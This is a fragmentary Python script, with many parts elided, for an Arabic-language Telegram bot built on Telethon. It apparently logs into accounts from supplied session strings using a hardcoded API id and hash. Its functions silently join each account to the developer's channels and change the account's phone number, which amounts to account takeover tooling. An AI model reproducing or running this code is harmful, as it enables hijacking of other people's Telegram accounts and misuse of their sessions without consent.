...
async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("ICTHONN"))
    except BaseException:
      pass
    try:
      await bot(join("DevNero"))
    except BaseException:
      pass
    try:
...
async def userinfo(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    k = await X.get_me()
    try:
      await X(join("@ICTHONN"))
    except BaseException:
      pass
    try:
      await X(join("DevNero"))
    except BaseException:
      pass
    try:
...
'''
mm = '''
ملاحظه انضم اولا للدعم @ICTHONN
'''
...
async def op(event):
  ...
  if not event.is_private:
    ...
    legendbye = [
      [
        Button.url("اضغط هنا", f"https://t.me/ICTHONN")
        ]
      ]
...
async def start(event):
  ...
  async with bot.conversation(event.chat_id) as x:
    keyboard = [
      ...
      [
        Button.url("المطور", "https://t.me/BEEEB5")
        ]
    ]
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      try:
        ...
        await event.respond("ارسل المشكله الى لحلها- @ICTHONN\n**LOGS**\n" + str(e))
...
print(" لقد تم تنصيب البوت بنجاح.     للمساعده راسل المعرف التالي. @C6ICC")
